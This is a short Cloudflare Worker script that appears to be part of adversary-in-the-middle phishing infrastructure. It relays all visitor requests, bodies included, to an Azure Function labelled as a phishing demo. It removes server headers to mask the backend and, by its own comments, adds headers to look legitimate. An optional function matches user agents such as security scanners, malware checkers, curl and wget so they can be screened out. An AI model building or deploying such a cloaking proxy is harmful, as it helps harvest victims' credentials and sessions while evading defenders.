// Cloudflare Worker for Domain Masking
// This worker proxies requests to our Azure Function to mask the domain

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Target Azure Function URL
  const targetUrl = 'https://azureaitm-phishing-demo-1755253259.azurewebsites.net'
  
  // Clone the request
  const url = new URL(request.url)
  const targetUrlObj = new URL(targetUrl)
  
  // Build the target URL
  targetUrlObj.pathname = url.pathname
  targetUrlObj.search = url.search
  
  // Create new request to Azure Function
  const newRequest = new Request(targetUrlObj.toString(), {
    method: request.method,
    headers: request.headers,
    body: request.body
  })
  
  try {
    // Fetch from Azure Function
    const response = await fetch(newRequest)
    
    // Clone the response
    const newResponse = new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: response.headers
    })
    
    // Modify response headers to mask the origin
    const modifiedHeaders = new Headers(newResponse.headers)
    
    // Remove headers that might reveal the backend
    modifiedHeaders.delete('server')
    modifiedHeaders.delete('x-powered-by')
    modifiedHeaders.delete('x-aspnet-version')
    
    // Add custom headers to make it look legitimate
    modifiedHeaders.set('x-frame-options', 'SAMEORIGIN')
    modifiedHeaders.set('x-content-type-options', 'nosniff')
    modifiedHeaders.set('referrer-policy', 'strict-origin-when-cross-origin')
    
    // Create final response
    return new Response(newResponse.body, {
      status: newResponse.status,
      statusText: newResponse.statusText,
      headers: modifiedHeaders
    })
    
  } catch (error) {
    // Handle errors gracefully
    return new Response('Service temporarily unavailable', {
      status: 503,
      headers: {
        'content-type': 'text/plain',
        'x-frame-options': 'SAMEORIGIN'
      }
    })
  }
}

// Optional: Add bot detection
function isBot(userAgent) {
  const botPatterns = [
    'bot', 'crawler', 'spider', 'scraper', 'scanner',
    'security', 'malware', 'virus', 'threat',
    'curl', 'wget', 'python', 'java', 'go-http-client'
  ]
  
  const ua = userAgent.toLowerCase()
  return botPatterns.some(pattern => ua.includes(pattern))
}
